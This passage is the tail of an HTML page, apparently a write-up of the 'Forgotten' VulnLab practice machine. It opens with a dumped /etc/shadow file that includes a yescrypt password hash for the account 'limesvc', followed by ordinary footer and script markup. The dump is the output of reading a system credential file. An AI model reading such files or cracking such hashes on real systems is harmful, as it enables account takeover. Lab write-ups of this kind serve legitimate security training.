class="line">root:*:19619:0:99999:7:::</span><br><span class="line">daemon:*:19619:0:99999:7:::</span><br><span class="line">bin:*:19619:0:99999:7:::</span><br><span class="line">sys:*:19619:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19619:0:99999:7:::</span><br><span class="line">games:*:19619:0:99999:7:::</span><br><span class="line">man:*:19619:0:99999:7:::</span><br><span class="line">lp:*:19619:0:99999:7:::</span><br><span class="line">mail:*:19619:0:99999:7:::</span><br><span class="line">news:*:19619:0:99999:7:::</span><br><span class="line">uucp:*:19619:0:99999:7:::</span><br><span class="line">proxy:*:19619:0:99999:7:::</span><br><span class="line">www-data:*:19619:0:99999:7:::</span><br><span class="line">backup:*:19619:0:99999:7:::</span><br><span class="line">list:*:19619:0:99999:7:::</span><br><span class="line">irc:*:19619:0:99999:7:::</span><br><span class="line">gnats:*:19619:0:99999:7:::</span><br><span class="line">nobody:*:19619:0:99999:7:::</span><br><span class="line">systemd-network:*:19619:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19619:0:99999:7:::</span><br><span class="line">messagebus:*:19619:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19619:0:99999:7:::</span><br><span class="line">syslog:*:19619:0:99999:7:::</span><br><span class="line">_apt:*:19619:0:99999:7:::</span><br><span class="line">tss:*:19619:0:99999:7:::</span><br><span class="line">uuidd:*:19619:0:99999:7:::</span><br><span class="line">tcpdump:*:19619:0:99999:7:::</span><br><span class="line">sshd:*:19619:0:99999:7:::</span><br><span class="line">pollinate:*:19619:0:99999:7:::</span><br><span class="line">landscape:*:19619:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19619:0:99999:7:::</span><br><span class="line">ec2-instance-connect:!:19619:0:99999:7:::</span><br><span class="line">_chrony:*:19619:0:99999:7:::</span><br><span class="line">ubuntu:!:19693:0:99999:7:::</span><br><span class="line">lxd:!:19693::::::</span><br><span class="line">dnsmasq:*:19693:0:99999:7:::</span><br><span class="line">limesvc:$y$j9T<span class="variable">$Ji2WZCXZPUQZy0z</span>/a2sxd/<span class="variable">$1HB</span>.drNZS25YS8IldncDIi1NGGHfTSJ6sWm.Qvl44i7:19693:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&text=VulnLab - Machine - Forgotten"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&is_video=false&description=VulnLab - Machine - Forgotten"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Forgotten&body=Check out this article: https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&name=VulnLab - Machine - Forgotten&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&t=VulnLab - Machine - Forgotten"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
